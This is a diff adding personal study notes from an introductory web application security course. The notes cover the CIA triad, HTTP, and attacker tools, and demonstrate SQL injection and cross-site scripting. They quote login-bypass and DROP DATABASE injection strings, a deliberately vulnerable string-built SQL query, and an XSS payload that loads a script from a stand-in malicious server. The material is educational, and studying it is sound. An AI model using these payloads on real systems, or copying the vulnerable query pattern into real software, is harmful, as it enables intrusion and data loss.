@@ -1,0 +1,884 @@
+Introduction to Web Application Security
+
+Content:
+Introduction
+01 About this Course
+02 Course Objectives
+03 Course Outline
+
+Section I: Why is Application Security Important?
+04 Overview
+05 Security Breaches and Vulnerabilities
+06 Application Security Goals
+07 Confidentiality, Integrity, Availability
+08 Software Security and Software Quality
+09 Software in a Perfect World
+10 Software in the Real World
+11 "Build" Culture vs "Measure" Culture
+12 Security Risks and Responses
+13 Knowledge Check #1
+14 Knowledge Check #2
+
+Section 2: HTTP Basics
+15 Overview
+16 HTTP Requests and Responses
+17 Request Lifecycle
+18 Basic Authentication
+19 Session Authentication
+20 Transport Layer Security (TLS)
+21 Tools of the Attacker - Fuzzing
+22 Tools of the Attacker - Web Proxies
+23 Knowledge Check #3
+24 Knowledge Check #4
+
+Section 3: Application Attack Demonstration
+25 Overview
+26 Examining the Application
+	> Exploit Search
+	> Exploit Login
+	> What About Error Messages
+	> Contact Forms
+	> Attackers See Things Differently
+27 Probing the Application
+	> Potential Login Exploits	
+	> Can the Data Store be Exploited
+	> Unexpected Response
+28 Attacking the Application
+	> Attacker Gains Access
+	> Attacker Compromised user's Account
+	> SQL Injection
+29 Knowledge Check #5
+30 Knowledge Check #6
+
+Section 4: Exploit Examples
+31 Overview
+32 SQL Injection Overview
+33 SQL Injection Overview (cont...)
+34 SQL Injection in Details
+35 Cross-Site Scripting Overview
+36 Cross-Site Scripting in Detail
+
+Section 5: Summary and Quiz
+37 Conclusion
+38 Additional Resources
+39 Thank you
+40 Enter Quiz
+
+
+
+
+
+
+
+
+
+Introduction
+01 About this Course
+
+Application Security
+ > ensuring that custom application code performs as expected under the entire range of possible inputs
+
+Attacker's GOAL
+ > find the behavior that Application does but is NOT SUPPOSE TO DO, and EXPLOIT IT
+
+
+
+02 Course Objectives
+
+Course Objectives
+1. Provide a working definition of application security
+2. Provide explanation of the chief application security concerns
+	> Confidentiality, Integrity, and Availability
+3. Explain why application security is important for organizations to address
+4. Demonstrate understanding of the basics of the Hypertext Transfer Protocol (HTTP)
+5. Describe the techniques used in a SQL injection attack and the ways a developer can guard against them
+6. Describe the techniques uised in a Cross-Site Scripting attack and the ways a developer can guard against them
+
+
+
+
+
+
+
+
+
+03 Course Outline
+
+Course Outline
+Section 1: Why is Application Security important?
+Section 2: HTTP Basics
+Section 3: Application Attack Demonstration
+Section 4: Exploit Examples
+Section 5: Summary and Quiz
+
+
+
+
+
+
+
+
+Section I: Why is Application Security Important?
+04 Overview
+
+Why AppSec is important?
+ > prevent the Application from attacks which exposes valuable data or changes how the app behave
+ > regulations in the medical, financial, and commercial spaces require organizations to take appsec seriously
+
+
+
+
+
+
+
+
+05 Security Breaches and Vulnerabilities
+
+Past Security Breackes
+1. jQuery Malware
+2. Target Stores in America
+ 	> a company use within this company opened a fake email containing malicious software that invaded the company's internal network
+	> results in 70million stolen personal data from customers
+3. Associated Press
+	> hacker managed to hijack AP's twitter feed which is used to post a false message about an attack at the White House
+	> result in stock prices to tumble and AP suffering significate reputational damage
+4. Federal Reserve
+	> fell victim to an attack launched by the hacktivist collective Anonymouse
+	> result in over 4000 back executives' confidential information being released
+
+Past Vulnerabilities
+1. Heartbleed
+	> Heartbleed Bug is a vulnerability in the widely used OpenSSL cryptographic software library
+	> allows the theft of information normally protected by SSL/TLS encryption by allowing an attacker to view the memory contents of systems using vulnerable versions of the OpenSSL library
+ 	> the bug is resulted from a programming error in the Heartbeat extension for the TLS/DTLS protocols
+		- this extension was designed to test and keep alive secure communications without having to renegotiate the connection repeatedly
+2. Shellshock
+	> the Shellshock bug affects versions of Bash (Boume Again Shell) up to version 4.3
+	> involves the way the shell processes functions defined within environment variables
+		- the shell will process any string included after the function definition, giving an attacker the ability to exploit certain server environment arbitrary code
+
+
+
+
+
+
+
+
+
+
+06 Application Security Goals
+
+NOTES:
+1. Those without knowledge of application security tends to FOCUS on INFRASTRUCTURE ISSUES such as
+	> firewalls
+	> intrusion detection
+	> virus scanning
+2. A useful starting point for determining if a system behavior is a potential vulnerability, is to imagine that the person who specified this system was setting next to you, then ask the following questions
+	> What behavior would they EXPECT to see from this application
+	> What behavior would they NOT EXPECT?
+
+
+GOALS in creating SECURE Application
+1. Confidentiality
+2. Integrity
+3. Availability
+
+
+
+
+
+
+
+
+
+07 Confidentiality, Integrity, Availability
+
+Confidentiality
+ > According to International Standards Organization (ISO), confidentiality means
+	- "ensuring that information is accessible only to those authorized to have access"
+ > ex: Customer must only be able to see their own orders and not the other customer's
+
+
+Integrity
+ > deals with a system's ability to ensure that information is kept "whole"
+ > specifically, that means information should only be modified by those users authorized to modify it
+ > ex: customer can only modify/change their own orders
+
+
+Availability
+ > means that system is online and responding to valid user requests
+ > some of the Availability problems is results of these exploits/attacks
+	1. Denial of Service
+		- an attack meant to shut down a machine or network, making it inaccessible to its intended users
+ 		- ex: anonymous users should NOT be able to flood the system with request, making it unavailable to majority of users
+
+
+
+
+
+
+
+
+
+08 Software Security and Software Quality
+
+Notes:
+1. AppSec is a SUBSET of Sofware Quality and Correctness (QA)
+2. QA practices is typically revolves around the application "requirement documentation" as the basis for their testing
+	> this means they will only test the application expected behavior is present
+	> this doesnt include application's behaviors that is present but is NOT EXPECTED
+3. Some measure to add in QA practices for AppSec includes
+	- Threat modeling
+	- Abuse case drafting
+	- Security audits
+
+EX:
+1. For banking application, we expect the customer to be able to transfer their balance from checking to savings account
+	> but if we extends to AppSec, we will also expect that customer will NOT be able to transfer balance from their checking account to other's saving account
+
+
+
+
+
+
+
+
+09 Software in a Perfect World
+
+Software
+ > typically the software will have the INTENDED and ACTUAL Functionality
+ 
+Intended Functionality
+ > these are the functionality that is intended to be the ONLY functionality present in the application and nothing else
+ > organization develop and document these intended functionalities of a system in a variety of ways like
+	1. Requirements Documents
+	2. Use Cases
+	3. User Stories
+	4. Design Documents
+	5. Architecture Specifications
+
+
+
+
+
+
+
+
+10 Software in the Real World
+
+Software in Real World
+ > in real world, Application's ACTUAL functionality will have both the Intended Functionality AND Unintended & Undocumented Functionality
+ > We can think of Intended and Actual functionality as TWO Circles that OVERLAPS PARTIALLY
+	1. All functionality that is PRESENT in Intended but NOT in Actual are either Missing Features or Bugs
+	2. All functionality that is PRESENT in Intended AND Actual are Built Features
+	3. All functionality that is NOT PRESENT in Intended and but PRESENT in Actual are the Unintended functionalities
+		- these are the goal of the Attackers, to KNOW these unintended functionalities and EXPLOIT them
+
+
+
+
+
+
+
+
+11 "Build" Culture vs "Measure" Culture
+
+Software Development groups
+ > has a "BUILD" culter
+ > Application Development practitioners tend to have a "build" culture
+	- They have to create something that did not exist before
+	- Focused on the following		
+		1. Create Systems
+		2. Functionality
+		3. Timelines
+
+
+Information Security groups
+ > has a "MEASURE" culture
+ > Traditional Information Security practitioners tend to have a "measure" culture
+	- They determine what is in place and audit the configuration of systems against standards
+	- Focused on		
+		1. Setting Standards
+		2. Auditing Configurations
+		3. Measuring and Monitoring
+
+
+
+
+
+
+
+
+
+12 Security Risks and Responses
+
+Security Risks and Responses
+1. Critical Systems are Internet-Facing
+2. Systems are not Built Securely
+3. Regulatory Requirements
+
+Critical Systems are Internet-Facing
+ > with critical systems being exposed to internet (e.x. e-commerce sites), it becomes more accessible to everyone, including the malicious attackers
+ > before, we can deploy network controls such as routers and firewalls to the system to restrict access to sensitive data.
+ > and now that web applications and other software are being used to control access to sensitive data, these application have to be built with those control capabilities in mind
+
+
+Systems are not Built Securely
+ > this is due to a variety of factors
+	1. Codes that are not meant to be used for hostile environments
+	2. Developers are not trained in designing and developing secure systems
+	3. Application security may not be a consideration in early
+
+Regulatory Requirements
+ > regulations began life that addresses the following issues
+	1. broad privacy issues
+	2. increase in high-profile, damaging breaches
+	3. security of stored user data
+ > these regulatory bodies and legistation include:
+	1. Payment Card Industry (PCI)
+		- specified requirements to train personnel and test the security of systems managing credit card data
+	2. Health Insurance Portability and Accountablity Act (HIPAA)
+		- government's regulations on health data
+		- provides channels for patients to file grievances against health care or insurance providers if such data is compromised
+	3. Federal Information Security Management Act of 2002 (FISMA)
+		- requires Federal agencies implement programs to provide security for information and informations systems that support agencies mission
+	4. Financial Services Modernization Act 
+		- requires financial institution that offer consumer-level financial products to delineate their information-sharing and privacy policies, and to pboth provide those policies to their customers, and safeguard the sensitive data describe in those policies
+	5. California SB 1386
+		- requires that businesses that lose or suspect that loss of unencrypted personal information directly notify each customer of the suspected compromise
+
+
+
+
+
+
+13 Knowledge Check #1
+14 Knowledge Check #2
+
+
+
+
+
+
+
+
+
+Section 2: HTTP Basics
+15 Overview
+
+NOTE:
+1. Application-level attacks often occur through attackers sending MALICIOUS HTTP request to the web application
+2. There is NO WAY to verify that incoming traffic was created by the actual web browser
+	> HTTP traffic is only data coming across the network and can be modified or crafted with variety of tools
+	> the same holds true for HTTPS traffic
+
+
+
+
+
+
+
+
+16 HTTP Requests and Responses
+
+HTTP
+ > The hyper-text transfer protocol is a clear text protocol
+ > When a web browser sends a request to a web application and receives a response from that application, the request and response both consist of text
+
+
+HTTP Requests
+ > HTTP Request contains the following
+	1. Request Type & URL
+		- contains the HTTP Verb used (GET, POST, PUT, DELETE), the URL/URI, and the protocol used and its version
+	2. Headers
+		- contains key value pairs separated by colon
+		- contains information necessary for the transaction
+	3. Request Body content 
+		- applicable only in POST and PUT request
+		- contains data in clear text as well
+
+
+GET vs POST HTTP Request
+ > with GET, we cant add Request body
+ > with POST, we can add Request body
+
+
+HTTP Response
+ > similar to HTTP request
+ > contains the following
+	1. Response HTTP protocol and Code
+	2. Response Headers
+	3. Content / Response body
+
+
+
+
+
+
+
+
+
+17 Request Lifecycle
+
+Request Lifecycle
+1. The web browser crafts the HTTP request
+2. The browser sends the request to the HTTP port (80 by default)
+3. Network devices and services determine where the message ultimately goes
+4. The application server receives the request through its own network device and port, sending it along to the application itself
+5. The response does not necessarily take the exact same trip back
+
+
+
+
+
+
+
+
+
+18 Basic Authentication
+
+Basic Authentication 
+ > an authentication scheme that uses username and password
+ > the browser will prompt the user to enter a username and password
+ > it will then concatenate the username and password with colon in between and encode the string in Base64
+	- NOTE: base64 is not an encryption, anyone can decode the original username and password if they have access to it (e.x. monitoring the traffic)
+
+
+
+
+
+
+
+
+
+
+19 Session Authentication
+
+Session Authentication
+ > authentication mechanism that involves the user providing username and password in a web page - hopefully over HTTPS so that attackers cannot observe the traffic while in transit
+ > server then AUTHENTICATES the credentials and assigns the user a SESSION IDENTIFIER
+	- session id typically is a large, random, temporary, and unfeasible to guess.
+ > this session id is then passed between the browser and the server throughout the user's user of the web application - typically via cookies
+
+
+
+
+
+
+
+
+
+
+20 Transport Layer Security (TLS)
+
+Transport Layer Security (TLS)
+ > can be used to secure the transport layer from malicious actions (i.e. listening and reading the request/response data)
+ 	- example includes the HTTPS
+ > with HTTPS, it can be used to encrypt traffic to make it unintelligible to attackers
+	- this must be used for all sensitive communications containing data such as the session id, username and passwords, and other data such us Social Security numbers
+
+
+NOTE:
+1. HTTPS only provides certain security services such as encryption
+	> attackers can also craft their own malicious HTTPS request
+ 	> with this, we must make sure that we still do validations to user input in server side
+
+
+
+
+
+
+
+
+
+21 Tools of the Attacker - Fuzzing
+
+Fuzzing
+ > with "fuzzing", they create a number of potentially invalid request to see how applications response
+ > Fuzzing is a common attack technique and its user underscores why webapp developers must be vigilant about validating data in incoming requests
+ > this invalid request is sent either using
+	- web proxy
+	- command line with curl
+	- fuzzers
+ > to make the request invalid, attackers can either
+	- add extremely large value of request payload
+	- empty value in one of request payload property
+	- remove altogether
+	- wrong type in request payload
+	- use of reserved characters
+	- using command attack string, related to sql injection
+
+
+
+
+
+
+
+
+
+22 Tools of the Attacker - Web Proxies
+
+Web Proxies
+ > Web proxy tools allow an attacker to trap request coming out of their browsers and modify them before they reach the web server
+ > Attackers can use web app normally until they reach the point where they want to make the attacks
+	- then they can use proxies to start trapping request before they are sent to the server to inject their desired attack payloads
+
+
+
+
+
+
+
+
+23 Knowledge Check #3
+24 Knowledge Check #4
+
+
+
+
+
+
+
+
+
+
+Section 3: Application Attack Demonstration
+25 Overview
+
+Overview
+1. Web app developers are typically focused on features, functions, and timelines
+	> They need to build certain features and functionality and they have a given time in which to do it
+	> But with this, they typically compromise the security of the application
+
+
+
+
+
+
+
+
+26 Examining the Application
+
+Examining the Application
+ > certain things determine an application's value to an attacker
+	1. What resources does it access?
+	2. Do users trust this application with sensitive information?
+	3. WHat are the ramifications of damaging its critical assets
+ > attackers have goals, which includes
+	1. steal information
+	2. take down systems
+	3. send spam email
+	4. corrupt the databases
+ > these goals includes breaking the
+	1. Confidentiality
+	2. Integrity
+	3. Availability
+ > in a Web application, there are following features that an Attacker can exploit, this includes
+	1. Exploit Search
+	2. Exploit Login
+	3. Error messages
+	4. Contact Forms
+
+
+Exploit Search
+ > the search bar is presumably ATTACHED to a database, file system, or some other data store that may contain confidential information
+ > if attack can select the right search queries or could create queries that cause the application to misbehave, it may be possible to get the application to disclose information that it shouldnt
+
+
+Exploit Login
+ > Login functionality has to be backed by some sort of credential information
+ 	- ex: combination of username and password
+ > Login screen could also be attacked to a database or directory such as an LDAP server
+ > If an attacker can steal login credentials from this application, that may give them access to other systems as user often resut username and password
+
+
+What About Error Messages
+ > error messages can give insight to attacker about the security vulnerabilities that is often found when application can be put into inconsistent states or when error conditions can be invoked
+
+
+Contact Forms
+ > also, looking at the Contact Us functionality and how it works makes it appear as though the application sends emails to communicate
+ > if an attacker's goal is to send spam email messages then the ability to send email via the web may be very attractive
+
+
+Attackers See Things Differently
+ > attackers often look to SUBVERT the application's functionality and compromise the
+	- Confidentiality, Integrity, and Availability
+ > this can be overlook by the Developers, whose main focus is
+	- Features, Functions, and Timelines
+
+
+
+
+
+
+
+
+
+27 Probing the Application
+
+Probing the Application
+ > Login page is probably the most interesting INITIAL attack point
+	- as mentioned before, there is some sort of CREDENTIAL STORE that this login page talks to, and credentials are very valuable
+ > In addition, getting past the login will presumably open up access to even more sensitive resources that the attacker can attempt to further exploit
+
+
+Potential Login Exploits
+1. Using common account names and password
+    	> These are simple, but often-used, user and password combination such as guest:guest, and admin:admin
+	> Many systems are shipped with default accounts and passwords turned on, so this can be very fruitful avenue of attack
+
+	
+Can the Data Store be Exploited
+ > Common Data Store exploited includes
+	1. Using reserved/special characters of the said database
+		- some database uses special/reserved keywords to perform operations
+		- in some login scheme, application typically inject the credentials in the database operations to do the authentication
+		- with some very specific strings to inject, attacker can make the database behave maliciously
+
+
+Unexpected Response
+ > attacker can make application so that it will send back an unexpected Response
+ > ex: if we try to use single quote in either username or password, we may create an exception in the application and in turn sends an HTML page with regards to the error
+	- typically this default HTML page contains the following information
+		1. Error/Exception message
+		2. Part of SQL statement for the login 
+		3. The application code that caused that error
+		4. The file directory of the said source code file
+			- give attacker idea about the application project structure
+		5. Stack trace
+			- give attacker about the environment the application is running
+		6. Path of the server page that was called
+		7. Version information for the underlying technology
+
+
+
+
+
+
+
+
+
+
+28 Attacking the Application
+
+Crafting an Exploit
+ > given that information, what does the attacker do next? These information includes
+	1. SQL server is used
+	2. SQL statement with substring with 'AND password='
+ > we can guess that the SQL statement used for login is
+	- SELECT * FROM User WHERE Username = <a user-provided username> AND Password = <a user-provided password>
+	- this returns a row that matches the input username and password
+ > with this information, we can make the application to inject ' OR 1=1 --'
+	- this will result in SQL query
+		-> SELECT * FROM User WHERE Username = '' OR 1=1 -- 'AND Password='junk'
+		-> -- makes the succeeding query as a COMMENT
+	- new SQL query returns all rows as output
+
+
+Attacker Gains Access
+ > if the SQL injection worked, the attacker can be logged in as the FIRST User row in the sql query output
+ > all information of that said user will be displayed on the webpage
+ > these are breaches of the Confidentiality of the System
+
+
+Attacker Compromised user's Account
+ > with this, we have compromised the User's account
+ > we can see some confidential informations such as credit card number and can even make a transaction
+	- this is not good since theres a mandate on how to handle credit card information (PCI) and this is not one of them
+ > this is also a breach to Integrity of the system
+
+
+SQL Injection
+ > part of the inejction attacks where attackers inject special strings to make the SQL behave in unintended manner
+ > this is preventable but software developers have to take time to guard against them
+
+
+
+
+
+
+
+
+
+29 Knowledge Check #5
+30 Knowledge Check #6
+
+
+
+
+
+
+
+
+
+
+
+Section 4: Exploit Examples
+31 Overview
+
+NOTE:
+1. Developers makes the assumption that inputs will CONFORM to their expections
+	> with this, they fail to guard against modified, potentially malicious inputs
+	> by exploiting this assumption, attackers are able to manipulate the behavior of applications to accomplish their goals.
+2. Two of most common attacks are Injection Attackers, and Cross-Site Scripting
+
+
+
+
+
+
+
+
+
+32 SQL Injection Overview
+
+SQL injection
+ > SQL injection occurs when unfiltered user inputs are COMBINED with static text and then sent to SQL interpreter
+ 	- The interpreter then executes queries of the attackers's choosing rather than the commands specified in the application
+ > THis is a very common application security flaw with potentially disastrous security implication
+
+
+NOTE:
+1. Injection flaws do not only apply to the communication of applications to database
+ 	> These can occur in the following	
+		1. LDAP request where we can inject arbitrary code
+		2. Operating system shell commands
+		3. XML interpreters
+2. Injection attacks such as these occur when an application receives malicious input and FAILS to properly scrutinize that input with appropriate validation and encoding
+
+
+
+
+
+
+
+
+
+33 SQL Injection Overview (cont...)
+
+SQL injection example
+
+Code
+String username = request.getParameter("username");
+String password = request.getParameter("password");
+strSql = "SELECT * FROM USERS WHERE USERNAME="" + username + "" AND PASSWORD=""+ password + "";
+
+
+Example input
+username = johndoe; password = myBirthdaya
+ > this would work as expected
+ > but, this ASSUMES that users will only enter alphanumeric characters to the username and password
+ > this assumption can be EXPLOITED by attackers
+
+
+
+
+
+
+
+
+
+34 SQL Injection in Details
+
+SQL Injection in Details
+ > with SQL injection, attacker can effectively injected an arbitrary command to the application's SQL interpreter
+
+Attacker's input => username = johndoe; password = '; DROP DATABASE; --
+ > using the code earlier, the resulting SQL query to be intepreted and executed is
+	- SELECT * FROM USERS WHERE USERNAME='johndoe' AND PASSWORD=''; DROP DATABASE; --'
+ > this query will be executed which will make the SQL drop the said database which may not only contain the USERS table
+
+
+NOTE:
+1. Attackers will attempt to use complacency on the part of developer to their advantage
+	> by guessing that the username and password input from database will be included in the SQL statement, the attacker can use SQL injection by including
+		1. characters that are considered special to SQL interpreters such as single quotes or double quotes, dash
+		2. reserved words such as DROP, OR, AND, etc
+
+
+
+
+
+
+
+
+
+35 Cross-Site Scripting Overview
+
+Cross-Site Scripting
+ > occurs when an application takes data from a user and sends it back to a web browser without validation or encoding.
+ > the victim's browser then renders the HTML and executes JavaScript chosen by the attacker
+ 	- note that this is not a direct attack on the APPLICATION, it is an attack on USERS of the application
+ > this is one of the most common web application security issues
+
+
+Example
+ > here, there is two users, the administration and a user
+ > user will create account with alphanumeric username and password
+ > this credentials maybe displayed in the administrator webpage
+
+EX:
+User credentials
+username = normalgirl
+email = normalgirl@gmail.com
+
+Administrator page
+<input type=text name="name" value="normalgirl"/>
+<input type="text" name="email" value="normalgirl@gmail.com"/>
+
+
+
+
+
+
+
+
+
+36 Cross-Site Scripting in Detail
+
+Cross-Site Scripting in Detail
+ > with malicious attacker, they can pass malicious string that will execute JavaScript code when injected in an HTML page
+ 
+
+EX:
+In example below, this will add the said <script> element, which in turn fetch the JavaScript file from the src property and EXECUTES IT.
+
+Malicious attacker input
+username = maliciousguy
+email = "><script src="http://maliciousserver/rewritepage.js"/>
+
+Administrator html page
+<input type=text name="name" value="maliciousguy"/>
+<input type="text" name="email" value=""><script src="http://maliciousserver/rewritepage.js"/>"/>
+
+
+
+
+
+
+
+
+
+Section 5: Summary and Quiz
+37 Conclusion
+
+In this course, we've learned
+1. The definition of application security
+2. The chief application security concern
+	- Confidentiality, Integrity, and Availability
+3. Why application security is important
+4. The basic mechanism of the Hypertext Transfer Protocol, or HTTP
+5. The technique involved in SQL injection attacks, and the measures a developer can take to protect agains them
+6. The technique used in a Cross-Site Scripting attack and the ways a developer can guard against them
+
+
+
+
+
+
+
+
+38 Additional Resources
+39 Thank you
+40 Enter Quiz
